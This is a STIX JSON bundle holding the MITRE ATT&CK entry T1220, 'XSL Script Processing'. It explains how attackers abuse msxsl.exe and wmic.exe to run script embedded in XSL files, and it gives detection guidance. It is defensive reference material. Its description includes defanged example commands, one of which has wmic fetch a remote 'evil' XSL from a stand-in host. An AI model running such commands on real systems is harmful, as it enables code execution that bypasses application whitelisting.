{
    "type": "bundle",
    "id": "bundle--c9f99bbb-9eb6-4f72-8062-6347d0dd4761",
    "spec_version": "2.0",
    "objects": [
        {
            "id": "attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "name": "XSL Script Processing",
            "description": "Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to [Trusted Developer Utilities](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018)\n\nCommand-line example: (Citation: Penetration Testing Lab MSXSL July 2017)\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n\nAnother variation of this technique, dubbed \u201cSquiblytwo\u201d, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file. (Citation: subTee WMIC XSL APR 2018) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1117)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool.\n\nCommand-line examples: (Citation: subTee WMIC XSL APR 2018)\n\n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* Remote File: <code>wmic os get /FORMAT:\u201dhttps[:]//example[.]com/evil[.]xsl\u201d</code>",
            "external_references": [
                {
                    "external_id": "T1220",
                    "url": "https://attack.mitre.org/techniques/T1220",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script",
                    "description": "Wenzel, M. et al. (2017, March 30). XSLT Stylesheet Scripting Using <msxsl:script>. Retrieved July 3, 2018.",
                    "source_name": "Microsoft XSLT Script Mar 2017"
                },
                {
                    "url": "https://www.microsoft.com/download/details.aspx?id=21714",
                    "description": "Microsoft. (n.d.). Command Line Transformation Utility (msxsl.exe). Retrieved July 3, 2018.",
                    "source_name": "Microsoft msxsl.exe"
                },
                {
                    "url": "https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/",
                    "description": "netbiosX. (2017, July 6). AppLocker Bypass \u2013 MSXSL. Retrieved July 3, 2018.",
                    "source_name": "Penetration Testing Lab MSXSL July 2017"
                },
                {
                    "url": "https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html",
                    "description": "Smith, C. (2018, April 17). WMIC.EXE Whitelisting Bypass - Hacking with Style, Stylesheets. Retrieved July 3, 2018.",
                    "source_name": "subTee WMIC XSL APR 2018"
                },
                {
                    "url": "https://twitter.com/dez_/status/986614411711442944",
                    "description": "Desimone, J. (2018, April 18). Status Update. Retrieved July 3, 2018.",
                    "source_name": "Twitter SquiblyTwo Detection APR 2018"
                },
                {
                    "url": "https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/",
                    "description": "Admin. (2018, March 2). Spear-phishing campaign leveraging on MSXSL. Retrieved July 3, 2018.",
                    "source_name": "Reaqta MSXSL Spearphishing MAR 2018"
                }
            ],
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "x_mitre_version": "1.0",
            "x_mitre_contributors": [
                "Casey Smith",
                "Praetorian"
            ],
            "x_mitre_data_sources": [
                "Process monitoring",
                "Process command-line parameters",
                "Process use of network",
                "DLL monitoring"
            ],
            "x_mitre_defense_bypassed": [
                "Anti-virus",
                "Application whitelisting",
                "Digital Certificate Validation"
            ],
            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: subTee WMIC XSL APR 2018) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.\n\nThe presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.",
            "x_mitre_permissions_required": [
                "User"
            ],
            "x_mitre_remote_support": false,
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_system_requirements": [
                "Microsoft Core XML Services (MSXML) or access to wmic.exe"
            ],
            "type": "attack-pattern",
            "kill_chain_phases": [
                {
                    "phase_name": "defense-evasion",
                    "kill_chain_name": "mitre-attack"
                },
                {
                    "phase_name": "execution",
                    "kill_chain_name": "mitre-attack"
                }
            ],
            "modified": "2018-10-31T13:45:13.024Z",
            "created": "2018-10-17T00:14:20.652Z"
        }
    ]
}